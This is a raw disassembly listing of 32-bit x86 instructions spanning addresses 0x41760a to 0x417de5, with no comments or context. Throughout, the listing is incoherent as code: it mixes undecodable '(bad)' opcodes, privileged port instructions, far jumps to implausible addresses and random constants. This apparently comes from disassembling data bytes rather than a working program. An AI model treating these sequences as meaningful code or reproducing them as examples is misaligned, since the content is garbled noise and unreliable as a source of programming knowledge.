  41760a:	in     eax,dx
  41760b:	hlt    
  41760c:	ftst   
  41760e:	repz dec edx
  417610:	imul   esp,DWORD PTR [ecx],0xa6a70139
  417616:	push   0x3e6f378d
  41761b:	xchg   esi,eax
  41761c:	cli    
  41761d:	push   eax
  41761e:	xchg   BYTE PTR [edx],bl
  417620:	(bad)  
  417621:	ins    BYTE PTR es:[edi],dx
  417622:	leave  
  417623:	idiv   BYTE PTR [eax+0x4a]
  417626:	retf   0x43e3
  417629:	(bad)  
  41762a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41762b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41762c:	sbb    eax,DWORD PTR [edi-0x75]
  41762f:	sub    ebp,ecx
  417631:	mov    dh,0x4f
  417633:	icebp  
  417634:	shl    DWORD PTR [ebp-0x67],cl
  417637:	mov    ch,0xa6
  417639:	cmp    eax,0x810aab49
  41763e:	loopne 0x417617
  417640:	jmp    0xcc50de2b
  417645:	jg     0x41766b
  417647:	cmp    ebp,DWORD PTR [ecx+0x23]
  41764a:	and    ebx,DWORD PTR [ebp-0x554a57b3]
  417650:	sahf   
  417651:	sub    ah,BYTE PTR [ecx+0x76]
  417654:	jns    0x417690
  417656:	bound  edx,QWORD PTR [ebx]
  417658:	and    bl,BYTE PTR [ebx+eiz*8-0x3c]
  41765c:	pop    esp
  41765d:	ins    BYTE PTR es:[edi],dx
  41765e:	jl     0x4176c1
  417660:	test   eax,0x5966488b
  417665:	(bad)  
  417666:	call   0x33f3:0x315c440a
  41766d:	pusha  
  41766e:	xchg   edi,eax
  41766f:	ret    
  417670:	adc    eax,0xb9c892df
  417675:	sbb    al,0xc2
  417677:	mov    dl,0xb3
  417679:	pop    esi
  41767a:	jp     0x4176c7
  41767c:	cdq    
  41767d:	push   0x5255e5de
  417682:	ja     0x417616
  417684:	adc    BYTE PTR ds:0xa57e8033,dh
  41768a:	in     al,0x58
  41768c:	pushf  
  41768d:	and    ah,BYTE PTR [edx]
  41768f:	lahf   
  417690:	outs   dx,DWORD PTR ds:[esi]
  417691:	adc    eax,0x95ddcc3c
  417696:	xor    al,0x1b
  417698:	ins    DWORD PTR es:[edi],dx
  417699:	mov    ch,0x8b
  41769b:	adc    DWORD PTR [eax],ebx
  41769d:	or     ah,dl
  41769f:	lods   al,BYTE PTR ds:[esi]
  4176a0:	lods   eax,DWORD PTR ds:[esi]
  4176a1:	inc    ebp
  4176a2:	adc    esp,DWORD PTR [ecx+0x17773830]
  4176a8:	lahf   
  4176a9:	add    dl,BYTE PTR [ecx-0x21760623]
  4176af:	loop   0x417689
  4176b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176b2:	mov    ebp,0x4c060e2b
  4176b7:	lods   al,BYTE PTR ds:[esi]
  4176b8:	aam    0x11
  4176ba:	arpl   WORD PTR [esi+0x35afad90],bp
  4176c0:	aad    0x9b
  4176c2:	adc    al,0xa6
  4176c4:	stos   DWORD PTR es:[edi],eax
  4176c5:	nop
  4176c6:	rcl    bl,1
  4176c8:	xchg   esp,eax
  4176c9:	dec    edx
  4176ca:	loopne 0x41765c
  4176cc:	push   eax
  4176cd:	dec    ebp
  4176ce:	test   BYTE PTR [ebx+0x5ff17f3],dl
  4176d4:	jl     0x4176d1
  4176d6:	nop    DWORD PTR [ebx+0x7b]
  4176da:	add    eax,0xa67ba097
  4176df:	stc    
  4176e0:	loope  0x417679
  4176e2:	call   0x76f5:0xd4d4ddc2
  4176e9:	jmp    0x8537:0xecf5dbd4
  4176f0:	cmp    al,0xd4
  4176f2:	ss mov esp,0x1b0545a5
  4176f8:	(bad)  
  4176f9:	adc    DWORD PTR [eax+ebx*1],esi
  4176fc:	pop    edx
  4176fd:	sbb    BYTE PTR ds:0x36514b3c,ah
  417703:	xor    BYTE PTR [eax],dh
  417705:	push   ecx
  417706:	aas    
  417707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417708:	mov    ebx,0x6595f4fd
  41770d:	out    dx,eax
  41770e:	out    dx,al
  41770f:	adc    BYTE PTR [ebp+0x29aae8cf],bl
  417715:	jns    0x4176cd
  417717:	call   0x33e4e3b2
  41771c:	push   ecx
  41771d:	and    dh,BYTE PTR [ecx+esi*4+0x29a1d51b]
  417724:	cmp    DWORD PTR [ecx],edx
  417726:	stc    
  417727:	pop    ebx
  417728:	mov    dh,0xd1
  41772a:	mov    DWORD PTR [edx+0x2e79fc35],edx
  417730:	mov    ebx,0x8babbc2d
  417735:	fwait
  417736:	cmp    BYTE PTR [ebp+0x6],al
  417739:	xchg   BYTE PTR [edx+0x39376029],ch
  41773f:	int3   
  417740:	inc    eax
  417741:	and    al,0xc4
  417743:	push   ds
  417744:	lods   al,BYTE PTR ds:[esi]
  417745:	cmp    DWORD PTR [edx],ebx
  417747:	cmp    BYTE PTR [ecx+0x4],ch
  41774a:	cld    
  41774b:	sbb    al,0xf8
  41774d:	inc    edx
  41774e:	jno    0x41777b
  417750:	imul   edx,DWORD PTR [eax+edx*1+0x4e],0x4b
  417755:	mov    DWORD PTR [edi+0x4773cd40],eax
  41775b:	fmul   DWORD PTR [ecx+0x71]
  41775e:	xor    bh,bl
  417760:	nop
  417761:	mov    ebp,0x4961abe6
  417766:	dec    eax
  417767:	jge    0x4177bd
  417769:	call   0xf3141976
  41776e:	loopne 0x417752
  417770:	ret    0x685f
  417773:	daa    
  417774:	enter  0x211f,0x17
  417778:	out    0x42,al
  41777a:	and    eax,0x58573050
  41777f:	cs cld 
  417781:	(bad)  
  417782:	adc    ah,dh
  417784:	sbb    ah,BYTE PTR [eax]
  417786:	jae    0x4177bc
  417788:	or     esi,edx
  41778a:	arpl   WORD PTR [ebx+edx*4],di
  41778d:	push   ebx
  41778e:	jg     0x417792
  417790:	mov    ds:0x554f85e2,al
  417795:	xchg   DWORD PTR [eax+edi*8],ecx
  417798:	js     0x4177c6
  41779a:	addr16 sbb eax,0xfd7bbbdf
  4177a0:	jl     0x41780b
  4177a2:	popf   
  4177a3:	sub    DWORD PTR [edi+0x5a7c8a60],esp
  4177a9:	jp     0x4177fc
  4177ab:	cmc    
  4177ac:	push   esi
  4177ad:	fisub  DWORD PTR [ebx+0x15]
  4177b0:	ror    BYTE PTR [esi+eax*2+0xa1ab451],0x7e
  4177b8:	repz add eax,0xa0b1f971
  4177be:	shl    DWORD PTR [esi-0x4800178f],cl
  4177c4:	hlt    
  4177c5:	test   DWORD PTR [esi+eiz*8],0x2c98c7e3
  4177cc:	shl    bl,cl
  4177ce:	or     eax,0x6a8494a9
  4177d3:	mov    eax,ds:0xa815080e
  4177d8:	push   eax
  4177d9:	loopne 0x417814
  4177db:	cmc    
  4177dc:	test   DWORD PTR [ebp-0x7e04748a],esi
  4177e2:	test   BYTE PTR [edi+ecx*4-0x36],dh
  4177e6:	sub    cl,BYTE PTR [eax+0x7097266]
  4177ec:	jne    0x417772
  4177ee:	leave  
  4177ef:	imul   BYTE PTR [ebp+0x69758928]
  4177f5:	dec    ebp
  4177f6:	mov    DWORD PTR [esi-0x9],ecx
  4177f9:	and    eax,ecx
  4177fb:	cli    
  4177fc:	dec    edx
  4177fd:	jmp    0x2d0:0x3bf852c1
  417804:	push   ecx
  417805:	in     al,0x7d
  417807:	add    eax,0x89619c85
  41780c:	mov    dh,0x4a
  41780e:	mov    eax,ds:0x4b5b910a
  417813:	and    DWORD PTR [esi-0x60],ebp
  417816:	pop    edx
  417817:	add    al,0x3
  417819:	(bad)  
  41781a:	pop    ds
  41781b:	popf   
  41781c:	stos   BYTE PTR es:[edi],al
  41781d:	(bad)  
  41781e:	shl    DWORD PTR [eax-0x3e1f398c],0x8f
  417825:	mov    ?,WORD PTR [edx-0x24]
  417828:	cld    
  417829:	push   ecx
  41782a:	mov    ebp,0xf7e757bb
  41782f:	add    dl,BYTE PTR [ecx-0x67904c27]
  417835:	lods   al,BYTE PTR ds:[esi]
  417836:	(bad)  [ebx-0x7467e242]
  41783c:	push   ss
  41783d:	sbb    al,0xaa
  41783f:	(bad)  
  417840:	aam    0x4a
  417842:	cld    
  417843:	inc    eax
  417844:	jmp    0x5bde:0x8943e052
  41784b:	outs   dx,BYTE PTR ds:[esi]
  41784c:	sub    ecx,eax
  41784e:	mov    ch,0x30
  417850:	in     eax,0x74
  417852:	test   BYTE PTR [eax+eiz*2-0x682a15fe],cl
  417859:	or     ch,cl
  41785b:	lock lock dec edi
  41785e:	adc    edx,0xffffffad
  417861:	pop    ebp
  417862:	rcl    BYTE PTR [ecx+0x29],1
  417865:	mov    ?,WORD PTR [edi+0x4d]
  417868:	or     al,BYTE PTR [edi+0x44]
  41786b:	push   ds
  41786c:	jge    0x41784e
  41786e:	jp     0x4178cf
  417870:	pop    ebx
  417871:	cwde   
  417872:	retf   
  417873:	outs   dx,DWORD PTR ds:[esi]
  417874:	jmp    0xf64f:0xa0d6a3c9
  41787b:	mov    eax,ds:0xdebc73da
  417880:	mov    al,ds:0x916ea5eb
  417885:	mov    fs,WORD PTR [edi-0x75ca31]
  41788b:	enter  0x2fb6,0xa2
  41788f:	xor    al,0x42
  417891:	ja     0x41783d
  417893:	out    dx,eax
  417894:	pushf  
  417895:	mov    BYTE PTR [ecx],bh
  417897:	out    dx,al
  417898:	es (bad) 
  41789b:	(bad)  
  41789c:	(bad)  
  41789d:	das    
  41789e:	test   eax,0xa6f1aebb
  4178a3:	dec    edi
  4178a4:	gs jg  0x4178f4
  4178a7:	mov    ebx,0x7ef943c8
  4178ac:	rcr    BYTE PTR [ecx],cl
  4178ae:	ret    
  4178af:	icebp  
  4178b0:	xor    al,0xf6
  4178b2:	xchg   ebp,eax
  4178b3:	retf   
  4178b4:	stc    
  4178b5:	sti    
  4178b6:	les    ebp,FWORD PTR [eax-0x44484c5d]
  4178bc:	ss push gs
  4178bf:	adc    ebx,ecx
  4178c1:	data16 (bad) 
  4178c3:	rcr    cl,0x1a
  4178c6:	das    
  4178c7:	icebp  
  4178c8:	push   ebp
  4178c9:	dec    ebx
  4178ca:	lds    eax,FWORD PTR [eax-0x3d622e2e]
  4178d0:	jno    0x417876
  4178d2:	ins    DWORD PTR es:[edi],dx
  4178d3:	mov    BYTE PTR [ebp-0x5f],ah
  4178d6:	or     edx,esp
  4178d8:	dec    ebp
  4178d9:	or     eax,0x2a0e3693
  4178de:	dec    eax
  4178df:	push   cs
  4178e0:	stos   DWORD PTR es:[edi],eax
  4178e1:	sub    BYTE PTR [edx-0x4aec8896],bh
  4178e7:	aad    0x3d
  4178e9:	inc    ecx
  4178ea:	dec    eax
  4178eb:	sar    DWORD PTR [edx+0x7e],cl
  4178ee:	jmp    0x687e72ed
  4178f3:	int    0xd3
  4178f5:	(bad)  
  4178f6:	popf   
  4178f7:	cmp    al,BYTE PTR [edx-0x3d]
  4178fa:	mov    ds:0x658500d,eax
  4178ff:	adc    ecx,DWORD PTR [esi+0x6a]
  417902:	adc    edi,ecx
  417904:	iret   
  417905:	xchg   ebx,eax
  417906:	push   cs
  417907:	mov    ch,0x1b
  417909:	fisub  DWORD PTR [ecx]
  41790b:	mov    ecx,0xb45f3edd
  417910:	fsubr  QWORD PTR [edx]
  417912:	cmp    DWORD PTR [edx+0x54],esp
  417915:	sub    esi,0x63c5d7d6
  41791b:	push   eax
  41791c:	push   ss
  41791d:	sbb    cl,BYTE PTR [ebp+0x67411303]
  417923:	out    dx,eax
  417924:	jae    0x417938
  417926:	nop
  417927:	mul    BYTE PTR [edi-0x4d4fc8ab]
  41792d:	retf   0x8fa
  417930:	aad    0xff
  417932:	lea    esp,[ecx+0x2acda469]
  417938:	test   BYTE PTR es:[edx],0xc8
  41793c:	into   
  41793d:	cld    
  41793e:	test   DWORD PTR [esi-0x18],ebx
  417941:	pop    ebx
  417942:	push   eax
  417943:	xor    eax,0x1bf4c0c3
  417948:	or     BYTE PTR cs:[esi],bh
  41794b:	outs   dx,BYTE PTR ds:[esi]
  41794c:	jns    0x4178ec
  41794e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41794f:	fidivr DWORD PTR [eax+0xe]
  417952:	mov    gs:0x809f16d7,al
  417958:	pop    edx
  417959:	scas   eax,DWORD PTR es:[edi]
  41795a:	mov    bl,0x8c
  41795c:	and    eax,0x2a278942
  417961:	adc    DWORD PTR [edx+ebp*1+0x2b],esi
  417965:	inc    ebx
  417966:	(bad)  
  417968:	cmp    DWORD PTR [ebx-0x80],esp
  41796b:	aaa    
  41796c:	pop    edx
  41796d:	mov    eax,0xd794a68e
  417972:	in     al,0xbd
  417974:	icebp  
  417975:	xor    DWORD PTR [eax+0x4c],ebp
  417978:	add    DWORD PTR [eax-0x2c],ebx
  41797b:	add    eax,0xd9aa5ef1
  417980:	and    esi,DWORD PTR [edi+eiz*8+0x214225fc]
  417987:	lods   eax,DWORD PTR ds:[esi]
  417988:	cmp    ecx,esp
  41798a:	(bad)  
  41798c:	mov    ds,WORD PTR [ebp-0x35]
  41798f:	xchg   ebp,eax
  417990:	ja     0x417931
  417992:	or     eax,0xb80fc9fe
  417997:	nop
  417998:	in     eax,dx
  417999:	xchg   edx,eax
  41799a:	test   eax,0xf4aecc4d
  41799f:	mov    bh,0x2c
  4179a1:	cmp    DWORD PTR [ebx-0x797f953b],0xffffff90
  4179a8:	cld    
  4179a9:	imul   ebp,DWORD PTR [ebx],0x887a422d
  4179af:	lods   al,BYTE PTR ds:[esi]
  4179b0:	in     eax,dx
  4179b1:	cmp    eax,DWORD PTR [esi-0x26]
  4179b4:	add    WORD PTR [ecx-0x351a5bd7],di
  4179bb:	inc    ecx
  4179bc:	test   BYTE PTR [edx-0x9a85721],0x19
  4179c3:	out    0xb2,eax
  4179c5:	push   es
  4179c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179c7:	popf   
  4179c8:	les    esi,FWORD PTR [edx]
  4179ca:	pusha  
  4179cb:	and    DWORD PTR [edx+0x6c],esi
  4179ce:	pop    di
  4179d0:	ret    
  4179d1:	mov    gs,WORD PTR [esi]
  4179d3:	adc    al,0x19
  4179d5:	sub    BYTE PTR [ebp-0x44],0xfd
  4179d9:	aaa    
  4179da:	xchg   ebp,eax
  4179db:	popf   
  4179dc:	out    0xab,eax
  4179de:	cmp    edi,DWORD PTR [bp+di+0x279b]
  4179e3:	and    DWORD PTR [edx+0x3c],0x220590ea
  4179ea:	push   cs
  4179eb:	mov    ecx,0x13571369
  4179f0:	retf   0x8419
  4179f3:	mov    al,ds:0xe179a5b
  4179f8:	push   esp
  4179f9:	mov    ch,0xe6
  4179fb:	pop    es
  4179fc:	push   cs
  4179fd:	or     BYTE PTR [ebx+0x369ec115],0xb6
  417a04:	jb     0x417a76
  417a06:	mov    ebx,0xdb2bc813
  417a0b:	leave  
  417a0c:	jne    0x4179b0
  417a0e:	neg    BYTE PTR [ecx-0x55619e2e]
  417a14:	dec    ecx
  417a15:	test   DWORD PTR [ebp-0x2a1dd413],ebp
  417a1b:	outs   dx,DWORD PTR ds:[esi]
  417a1c:	add    dh,BYTE PTR gs:0xb3d971e2
  417a23:	lahf   
  417a24:	fdivr  DWORD PTR [eax+0x15]
  417a27:	mov    ah,0x1c
  417a29:	loop   0x417aa9
  417a2b:	xor    eax,0xaadf5868
  417a30:	add    esi,DWORD PTR [ebx*8-0x69553660]
  417a37:	jne    0x417a8b
  417a39:	mov    ecx,0x1d891fee
  417a3e:	test   al,0x9f
  417a40:	mov    ds:0x572b8ee3,eax
  417a45:	and    eax,0x77fdaa27
  417a4a:	pop    esp
  417a4c:	pusha  
  417a4d:	outs   dx,BYTE PTR ds:[esi]
  417a4e:	jmp    0x98c0:0xd9d3478a
  417a55:	mov    bl,0x9f
  417a57:	pop    eax
  417a58:	add    BYTE PTR [edx-0x14d61a63],bl
  417a5e:	repnz push ecx
  417a60:	add    DWORD PTR [esi],ecx
  417a62:	aaa    
  417a63:	mov    cl,0x60
  417a65:	les    eax,FWORD PTR [ebp+0x2]
  417a68:	sbb    ebp,DWORD PTR [esi+ebp*8]
  417a6b:	lahf   
  417a6c:	das    
  417a6d:	cdq    
  417a6e:	leave  
  417a6f:	mov    bh,0xf2
  417a71:	out    dx,al
  417a72:	fiadd  WORD PTR [eax]
  417a74:	and    BYTE PTR [ecx+0x35],ch
  417a77:	mov    eax,ds:0xc76bce76
  417a7c:	mov    edx,0xc1fdb74f
  417a81:	pop    es
  417a82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a83:	cmc    
  417a84:	add    eax,0x72bb6ab6
  417a89:	push   edx
  417a8a:	int    0xf7
  417a8c:	cmp    eax,ebx
  417a8e:	pop    edi
  417a8f:	pushf  
  417a90:	sbb    al,0x9d
  417a92:	push   0xffffffc0
  417a94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a95:	sar    BYTE PTR [edx+0x71],0xf1
  417a99:	not    edi
  417a9b:	push   es
  417a9c:	aam    0x2e
  417a9e:	or     ebx,DWORD PTR [eax+0x26]
  417aa1:	dec    esp
  417aa2:	push   esp
  417aa3:	mov    esi,DWORD PTR [esi-0x59d4d397]
  417aa9:	ret    
  417aaa:	sub    BYTE PTR [edi],ch
  417aac:	cwde   
  417aad:	cmp    BYTE PTR [ebp-0x1db544b3],dl
  417ab3:	je     0x417a9c
  417ab5:	outs   dx,BYTE PTR ds:[esi]
  417ab6:	idiv   BYTE PTR [ebx-0x8]
  417ab9:	call   0xbe4d0e02
  417abe:	sbb    DWORD PTR [esi+0x66bd0826],ecx
  417ac4:	inc    esp
  417ac5:	and    eax,0xe1ae2025
  417aca:	leave  
  417acb:	mov    BYTE PTR [ebp+0x40],al
  417ace:	mov    cl,0xa9
  417ad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ad1:	out    0x8f,al
  417ad3:	arpl   sp,bp
  417ad5:	sbb    eax,DWORD PTR ds:[ecx+edi*2]
  417ad9:	gs sub eax,0x6eb705d9
  417adf:	mov    BYTE PTR [ecx+0x6c66c193],ah
  417ae5:	mov    edx,0x3c6a2ee3
  417aea:	aad    0x99
  417aec:	fld    TBYTE PTR [eax]
  417aee:	add    DWORD PTR [ebp-0x48a60c07],esi
  417af4:	mov    cl,0x12
  417af6:	add    eax,0x2e068e05
  417afb:	dec    eax
  417afc:	scas   eax,DWORD PTR es:[edi]
  417afd:	out    dx,al
  417afe:	xor    DWORD PTR [esi-0x442b440a],esp
  417b04:	outs   dx,DWORD PTR ds:[esi]
  417b05:	and    DWORD PTR [edx-0x5b57899b],edx
  417b0b:	sub    eax,0xc19d9bcf
  417b10:	not    BYTE PTR [edi-0x54]
  417b13:	dec    esp
  417b14:	mov    bh,cl
  417b16:	mov    ch,0x4d
  417b18:	xor    cl,BYTE PTR [esi+0x22]
  417b1b:	or     al,0x93
  417b1d:	or     BYTE PTR [esi+edx*8+0x763d6f6e],bh
  417b24:	mov    ecx,0x9d822645
  417b29:	inc    ebp
  417b2a:	scas   eax,DWORD PTR es:[edi]
  417b2b:	mov    al,0x59
  417b2d:	fcom   DWORD PTR [eax]
  417b2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b30:	lock pop ebx
  417b32:	out    dx,eax
  417b33:	add    ecx,ecx
  417b35:	or     eax,0xe49a7ec
  417b3a:	lahf   
  417b3b:	sub    DWORD PTR [ecx+edi*4],esi
  417b3e:	jecxz  0x417b44
  417b40:	cmp    DWORD PTR [esi],esi
  417b42:	adc    eax,0x693505a8
  417b47:	inc    edi
  417b48:	inc    ebp
  417b49:	(bad)  
  417b4a:	xchg   edi,eax
  417b4b:	(bad)  
  417b4c:	push   edi
  417b4d:	iret   
  417b4e:	pop    esi
  417b4f:	mov    fs,WORD PTR [eax-0x67]
  417b52:	jmp    0x1c03:0x9508f8be
  417b59:	cmp    BYTE PTR [eax-0x7c6d4931],ch
  417b5f:	retf   
  417b60:	jg     0x417b5d
  417b62:	gs popa 
  417b64:	adc    al,0x72
  417b66:	dec    edi
  417b67:	fwait
  417b68:	int    0xc9
  417b6a:	dec    ecx
  417b6b:	mov    bl,0xba
  417b6d:	jle    0x417bee
  417b6f:	cmp    ebp,DWORD PTR [ebx+0x22fca32b]
  417b75:	add    BYTE PTR [ebx],0x81
  417b78:	jg     0x417bcd
  417b7a:	sub    eax,0xae59b760
  417b7f:	mov    ebp,DWORD PTR [esi]
  417b81:	popa   
  417b82:	and    eax,0x9aad0b75
  417b87:	push   esi
  417b88:	push   cs
  417b89:	cmp    eax,0xaab3341a
  417b8e:	pushf  
  417b8f:	shl    BYTE PTR [esi],cl
  417b91:	jbe    0x417b5f
  417b93:	sar    bl,1
  417b95:	mov    cl,0x3d
  417b97:	inc    eax
  417b98:	jb     0x417c02
  417b9a:	nop
  417b9b:	dec    esi
  417b9c:	dec    esp
  417b9d:	cmp    al,0xdb
  417b9f:	aaa    
  417ba0:	and    esi,DWORD PTR [edx+0x28255129]
  417ba6:	dec    edi
  417ba7:	adc    al,0xb2
  417ba9:	sti    
  417baa:	add    bh,BYTE PTR [ebp-0x43]
  417bad:	jns    0x417bac
  417baf:	sbb    DWORD PTR ds:0x8423d789,esi
  417bb5:	sbb    DWORD PTR [ebp-0x724b9207],ebx
  417bbb:	push   cs
  417bbc:	fcmovnu st,st(4)
  417bbe:	retf   
  417bbf:	or     dh,BYTE PTR [ebx+eiz*1]
  417bc2:	xor    esi,ebx
  417bc4:	jne    0x417bfe
  417bc6:	fisttp DWORD PTR [ecx-0xd]
  417bc9:	call   0xe222adfc
  417bce:	sbb    al,0x41
  417bd0:	dec    ebx
  417bd1:	mov    dh,0x62
  417bd3:	pop    eax
  417bd4:	mov    esp,0x7e8daac4
  417bd9:	dec    edx
  417bda:	cdq    
  417bdb:	mov    al,ds:0xeb2dd0f3
  417be0:	push   ebp
  417be1:	adc    al,0x6e
  417be3:	std    
  417be4:	out    0x18,al
  417be6:	in     eax,dx
  417be7:	or     dl,BYTE PTR [esi]
  417be9:	and    esi,DWORD PTR [esi+0x3bd13dba]
  417bef:	mov    cl,0x2c
  417bf1:	punpckhdq mm0,QWORD PTR [ebx+0x6176d4e8]
  417bf8:	sbb    bh,BYTE PTR [edi-0x32]
  417bfb:	cmp    al,0x92
  417bfd:	mul    DWORD PTR [ebp+0x11414c86]
  417c03:	int3   
  417c04:	in     eax,0xf1
  417c06:	mov    edi,DWORD PTR ds:0x651ce31a
  417c0c:	adc    BYTE PTR [edx+0x75],0xbd
  417c10:	pushf  
  417c11:	out    0x73,eax
  417c13:	shl    DWORD PTR [ebp-0x43],1
  417c16:	js     0x417c29
  417c18:	ror    BYTE PTR [eax],1
  417c1a:	test   bl,0x83
  417c1d:	jmp    0xb5f6:0xd0ff3e62
  417c24:	rcr    ebp,0xf1
  417c27:	mul    ch
  417c29:	push   eax
  417c2a:	cdq    
  417c2b:	inc    ebp
  417c2c:	or     eax,DWORD PTR [ecx]
  417c2e:	mov    edx,0xb8c19ea9
  417c33:	mov    edx,0x9453c1ef
  417c38:	push   edi
  417c39:	hlt    
  417c3a:	repz push ecx
  417c3c:	push   ds
  417c3d:	fild   WORD PTR [edx]
  417c3f:	sahf   
  417c40:	mov    cl,0xd2
  417c42:	xor    ecx,edi
  417c44:	in     eax,dx
  417c45:	mov    WORD PTR [edx-0x3a],?
  417c48:	test   DWORD PTR [ecx],0x510efdc3
  417c4e:	jecxz  0x417c10
  417c50:	mov    al,0xe0
  417c52:	add    eax,0x7036e4d3
  417c57:	jb     0x417c22
  417c59:	and    eax,0x6f7f89d
  417c5e:	les    esp,FWORD PTR [ecx]
  417c60:	enter  0x3346,0xeb
  417c64:	inc    ecx
  417c65:	(bad)  
  417c66:	and    eax,0x35602bca
  417c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c6c:	lods   al,BYTE PTR ds:[esi]
  417c6d:	clc    
  417c6e:	push   edx
  417c6f:	mov    ds:0x37201a4f,ax
  417c75:	add    DWORD PTR [edi+ebx*8],edx
  417c78:	push   esp
  417c79:	(bad)  
  417c7a:	sbb    ebx,DWORD PTR [esp+eax*1]
  417c7d:	dec    esp
  417c7e:	out    0x72,al
  417c80:	xchg   edx,eax
  417c81:	js     0x417d02
  417c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c84:	dec    DWORD PTR [ecx-0x13]
  417c87:	cmp    eax,0x384f93d0
  417c8c:	or     esp,DWORD PTR [ebx+0x2a]
  417c8f:	stos   BYTE PTR es:[edi],al
  417c90:	loopne 0x417c91
  417c92:	cmp    BYTE PTR [ecx-0x72],dl
  417c95:	dec    eax
  417c96:	nop
  417c97:	cdq    
  417c98:	mov    DWORD PTR [edi-0x76ff2584],ecx
  417c9e:	retf   0x9dc8
  417ca1:	jns    0x417c5d
  417ca3:	sbb    eax,0x1b59233
  417ca8:	(bad)  
  417ca9:	icebp  
  417caa:	pop    ds
  417cab:	aad    0xca
  417cad:	lahf   
  417cae:	out    dx,eax
  417caf:	push   eax
  417cb0:	dec    ebp
  417cb1:	pop    edi
  417cb2:	jp     0x417d30
  417cb4:	bound  ecx,QWORD PTR [edi-0x5f]
  417cb7:	lea    edx,[edi+0x68b84715]
  417cbd:	adc    BYTE PTR [esp+ebp*4+0x77],0x36
  417cc2:	and    DWORD PTR [ecx],ebp
  417cc4:	(bad)  
  417cc6:	es push ebx
  417cc8:	int    0x3d
  417cca:	push   esi
  417ccb:	enter  0xb175,0xd6
  417ccf:	sub    cl,bh
  417cd1:	dec    esi
  417cd2:	(bad)  
  417cd3:	jnp    0x417d08
  417cd5:	ret    0x121f
  417cd8:	xchg   ecx,ebx
  417cda:	cmp    edi,esp
  417cdc:	imul   ecx,esp,0x22089a9b
  417ce2:	imul   ebx,DWORD PTR [ebx-0x7f],0x1c07c5c8
  417ce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cea:	test   DWORD PTR [edi+0x2bbab2d8],edi
  417cf0:	fmulp  st(1),st
  417cf2:	dec    esi
  417cf3:	fdivr  DWORD PTR ss:[edi-0xc36c435]
  417cfa:	mov    al,0xf4
  417cfc:	fcomp  DWORD PTR [edx-0x6676e738]
  417d02:	out    dx,eax
  417d03:	mov    ebp,0x54ce5ab4
  417d08:	adc    al,0xd3
  417d0a:	jns    0x417d32
  417d0c:	xchg   esp,eax
  417d0d:	aas    
  417d0e:	(bad)  
  417d0f:	sub    dh,BYTE PTR [ebx]
  417d11:	stc    
  417d12:	nop
  417d13:	push   ecx
  417d14:	jo     0x417d3d
  417d16:	push   cs
  417d17:	inc    esi
  417d18:	sti    
  417d19:	sti    
  417d1a:	adc    cl,BYTE PTR [ebx]
  417d1c:	pushf  
  417d1d:	push   eax
  417d1e:	mov    esi,0xc195c060
  417d23:	daa    
  417d24:	ss mov bl,0x5b
  417d27:	and    BYTE PTR [edx],bl
  417d29:	std    
  417d2a:	retf   
  417d2b:	xchg   edi,eax
  417d2c:	mov    ah,0x28
  417d2e:	adc    BYTE PTR [edi],0x5b
  417d31:	mov    ebp,0xa7ce2795
  417d36:	adc    edx,DWORD PTR [eax-0x5545551c]
  417d3c:	push   esi
  417d3d:	popf   
  417d3e:	pop    ss
  417d3f:	adc    cl,bl
  417d41:	and    eax,0x6270da9c
  417d46:	repz or bl,bh
  417d49:	mov    al,ds:0xb20d8a70
  417d4e:	inc    esi
  417d4f:	inc    ecx
  417d50:	xchg   ecx,eax
  417d51:	into   
  417d52:	cmp    esi,0x7
  417d55:	lods   eax,DWORD PTR ds:[esi]
  417d56:	cmp    BYTE PTR [ecx+0x71],cl
  417d59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d5a:	out    dx,al
  417d5b:	arpl   WORD PTR ds:0xa3d968c1,cx
  417d61:	push   cs
  417d62:	ret    0x97c1
  417d65:	sub    bh,cl
  417d67:	(bad)  
  417d6b:	adc    dh,0xba
  417d6e:	xor    BYTE PTR [esi],bl
  417d70:	dec    edi
  417d71:	sub    eax,0xb32509fe
  417d76:	jle    0x417d34
  417d78:	mov    ecx,0x2dd4abbd
  417d7d:	(bad)  
  417d7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d7f:	cld    
  417d80:	sahf   
  417d81:	or     cl,BYTE PTR [ebp-0x47614cd7]
  417d87:	xchg   ebp,eax
  417d88:	pusha  
  417d89:	add    BYTE PTR [ebx],al
  417d8b:	push   ecx
  417d8c:	xor    DWORD PTR [edi-0x55],esp
  417d8f:	inc    esi
  417d90:	movq   QWORD PTR [ebx],mm0
  417d93:	xor    BYTE PTR [edx-0x631ea470],0xbe
  417d9a:	push   0xffffffc7
  417d9c:	aaa    
  417d9d:	sbb    eax,0x61dc90d7
  417da2:	xchg   esp,eax
  417da3:	sbb    al,0x52
  417da5:	sub    al,0x2e
  417da7:	ret    0xff8d
  417daa:	pop    edx
  417dab:	popf   
  417dac:	adc    edi,DWORD PTR [esi]
  417dae:	and    ecx,ebx
  417db0:	jne    0x417e18
  417db2:	aas    
  417db3:	and    al,0x94
  417db6:	sub    DWORD PTR [edi+0x2b],edx
  417db9:	jb     0x417de0
  417dbb:	iret   
  417dbc:	xchg   dl,bl
  417dbe:	pop    edx
  417dbf:	pop    es
  417dc0:	dec    edi
  417dc1:	jno    0x417d90
  417dc3:	mov    ch,0xc5
  417dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dc6:	push   0x1fc6cec6
  417dcb:	rcl    al,0x8c
  417dce:	mov    ds:0xfea5c51b,al
  417dd3:	xchg   edx,eax
  417dd4:	dec    ecx
  417dd5:	and    eax,0x783ea6cb
  417dda:	call   0x2f2255cc
  417ddf:	scas   eax,DWORD PTR es:[edi]
  417de0:	mov    ebx,0x3c1e8c55
  417de5:	out    dx,eax
